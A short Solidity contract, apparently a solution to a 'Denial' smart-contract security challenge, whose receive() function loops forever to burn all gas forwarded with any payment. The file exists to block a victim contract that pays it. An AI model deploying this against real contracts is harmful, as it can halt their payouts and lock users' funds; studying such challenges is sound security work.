// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.16 <0.9.0;

contract Cracked20_Denial {
    receive() external payable {
        while (true) {
            uint256 ss = type(uint256).max;
            ss--;
        }
    }
}
